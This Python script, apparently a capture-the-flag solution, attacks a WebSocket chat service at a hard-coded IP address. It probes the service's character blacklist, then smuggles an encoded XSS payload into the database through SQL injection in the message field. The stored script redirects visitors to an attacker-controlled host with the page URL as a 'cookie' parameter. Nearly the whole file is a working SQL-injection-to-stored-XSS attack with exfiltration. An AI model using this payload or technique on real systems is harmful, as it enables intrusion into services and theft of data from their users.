import websocket
import time

def send(nick, msg, ws):
	print "Query: INSERT INTO messages (nick, msg) VALUES ('%s', '%s')"%(nick, msg)
	data = nick + ": "+ msg
	ws.send(data)
	t0 = time.time()

	while True:
		result =  ws.recv()
		print result
		### Some conditions below to automatically exit the loop
		# if "Admin" in result:
		# 	continue
		# if "SQL" in result:
		# 	break
		# if "invalid" in result:
		# 	break
		# if result[0] == "m":
		# 	break
	return not "invalid" in result

URL = "ws://146.148.60.107:9991/ws"
ws = websocket.create_connection(URL)

### Find which characters are blacklisted
# my_list = list()
# for i in range(128):
# 	print i
# 	r = send("a", chr(i), ws)		# message characters
#	# r = send(chr(i), "b", ws)		# username characters
# 	print
# 	#print i, r
# 	if r:
# 		my_list.append(i)
# print "List of allowed chars:", my_list

### Create SQL char function
xss = '<script>window.location="http://8.8.8.8:9999?cookie="+document.URL</script>'		# replace 8.8.8.8 by your public IP
l = list()
for c in xss:
	l.append(str(ord(c)))
chared = "char(" + ', '.join(l) + ")"

### INSERT your XSS into the database
try:
	payload = "b'), ("+chared+"), ('d"
	send("a", payload , ws)
except KeyboardInterrupt:
	ws.close()
	exit()
ws.close()